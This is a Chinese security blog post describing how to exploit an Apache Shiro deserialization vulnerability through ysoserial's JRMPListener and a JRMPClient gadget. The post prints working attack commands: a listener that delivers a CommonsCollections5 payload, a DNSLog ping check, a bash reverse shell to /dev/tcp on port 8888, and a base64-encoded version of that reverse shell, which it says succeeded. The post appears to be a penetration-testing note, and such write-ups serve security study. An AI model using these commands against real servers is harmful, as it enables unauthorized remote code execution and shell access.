---
title: shiro反序列漏洞中JRMPClient利用
url: https://www.secpulse.com/archives/192266.html
source: 安全脉搏
date: 2022-11-26
fetch_date: 2025-10-03T23:48:25.760789
---

# shiro反序列漏洞中JRMPClient利用

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# shiro反序列漏洞中JRMPClient利用

[资讯](https://www.secpulse.com/archives/category/news)

[TideSec](https://www.secpulse.com/newpage/author?author_id=26366)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2022-11-25

13,087

# 前言

最近在测试中遇到一些shiro反序列化不能利用的情况 找到key 无法找到利用链，但是发现存在JRMPClient可用的情况

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192266-1669348073.png "null")

换一种工具尝试

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192266-1669348074.png "null")

发现 JRMPClient 可用， 尝试使用 JRMPClient 进行测试，最终这个目标也没有执行成功所以换了一个目标进行的尝试，仅记录JRMPClient 利用方式。

# 使用JRMPClient模块进行测试

找到一个同样存在shiro反序列的目标。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192266-1669348076.png "null")

同样find: JRMPClient can be use。

## 搭建JRMPClient 监听服务

首先需要搭建 JRMPClient 使用ysoserial.jar 工具搭建服务，下载地址：https://github.com/frohoff/ysoserial

## 使用DNSLOG进行检测

在不确定目标是否通外网的情况下 先使用DNSLOG进行检测 获取一个新的域名 ：w3dh1h.dnslog.cn

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192266-1669348081.png "null")

## VPS上开启JRMPListener

在VPS上搭建服务命令

java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 6789 CommonsCollections5 "ping w3dh1h.dnslog.cn"

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192266-1669348087.png "null")

shiro反序列利用工具中选择JRMPClient,然后输入VPS上搭建服务的地址：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192266-1669348088.png "null")

JRMPListener 收到返回信息

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192266-1669348090.png "null")

DNSLOG上收到目标的ping 命令信息 说明目标服务器通外网

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192266-1669348093.png "null")

## 执行反弹命令

执行反弹命令 bash -i >& /dev/tcp/xxxxxx/8888 0>&1

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192266-1669348094.png "null")

没有收到反弹链接

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192266-1669348095.png "null")

将命令进行base64编码 java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 6789 CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eC54eC54eC54eHgvODg4OCAwPiYx}|{base64,-d}|{bash,-i}"

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192266-16693480951.png "null")

成功收到反弹链接

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192266-1669348097.png "null")

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192266-1669348100.gif)

E

N

D

**本文作者：[TideSec](newpage/author?author_id=26366)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/192266.html**](https://www.secpulse.com/archives/192266.html)

Tags: [DNSLog](https://www.secpulse.com/archives/tag/dnslog)、[JRMPclient](https://www.secpulse.com/archives/tag/jrmpclient)、[shiro反序列漏洞](https://www.secpulse.com/archives/tag/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E)、[vps](https://www.secpulse.com/archives/tag/vps)

点赞：
4
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![命令执行/SQL盲注无回显外带方式](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/06/16544992511-300x190.png)

  命令执行/SQL盲注无回显外带方式](https://www.secpulse.com/archives/180408.html "详细阅读 命令执行/SQL盲注无回显外带方式")
* [![使用python javaSerializationTools模块拼接生成 8u20 Gadget](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2021/08/16346317891-300x200.png)

  使用python javaSeriali…](https://www.secpulse.com/archives/163893.html "详细阅读 使用python javaSerializationTools模块拼接生成 8u20 Gadget")
* [![HW前你需要了解的weblogic攻击手法](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2021/08/16345378381-300x200.png)

  HW前你需要了解的weblogic攻击手…](https://www.secpulse.com/archives/163899.html "详细阅读 HW前你需要了解的weblogic攻击手法")

评论  (0)

昵称

必填
您当前尚未登录。
[登录？](https://www.secpulse.com/user_login "登录")
[注册](https://www.secpulse.com/user-register)

邮箱

必填（保密）

快来写下你的想法吧！

upload

|  |  |  |
| --- | --- | --- |
| [![]( https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/43b12cc12b9dbbe6a010c40d69088feb-300x298.png)](https://www.secpulse.com/newpage/author?author_id=26366aaa) | [TideSec ![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)](https://www.secpulse.com/newpage/author?author_id=26366) | |
| 文章数：145 | 积分： 185 |
|  | |

* [![阿波罗主机安全管理](/wp-content/themes/secpulse2017/img/product-agent.png)](https://linkage.duoyinsu.com)
* [![伏特漏洞扫描云平台](/wp-content/themes/secpulse2017/img/product-fute.png)](https://v.duoyinsu.com)

### 安全问答社区

![安全问答社区](https://www.secpulse.com/wp-content/themes/secpulse2017/img/xcx.png)

### 脉搏官方公众号

![脉搏公众号](https://www.secpulse.com/wp-content/themes/secpulse2017/img/SecPulse.png)

### 活动日程

[显示更多](https://www.secpulse.com/newpage/activity)

#### 2022-06-17

[Gdevops 全球敏捷运维峰会](https://www.bagevent.com/event/8022600?bag_track=AQMB)

#### 2022-05-12

[Mastering the Challenge！——来自The 3rd AutoCS 2022智能汽车信息安全大会的邀请函](https://autocs2022.artisan-event.com/)

#### 2021-11-18

[AutoSW 2021智能汽车软件开发大会](https://autosw2021.artisan-event.com)

#### 2021-06-27

[2021中国国际网络安全博览会暨高峰论坛](http://www.sins-expo.com)

#### 2021-05-27

[The 2nd AutoCS 2021智能汽车信息安全大会](https://artisan-event.com/AutoCS2021/)

#### 2020-12-18

[贝壳找房2020 ICS安全技术峰会](https://www.4hou.com/tickets/bmZO)

#### 2020-12-11

[全球敏捷运维峰会（Gdevops2020）](https://www.bagevent.com/event/6243820?bag_track=AQMB)

#### 2020-12-04

[2020京麒网络安全大会](https://www.huodongxing.com/event/5569026023500)

#### 2020-11-29

[OPPO技术开放日第六期|聚焦应用与数据安全防...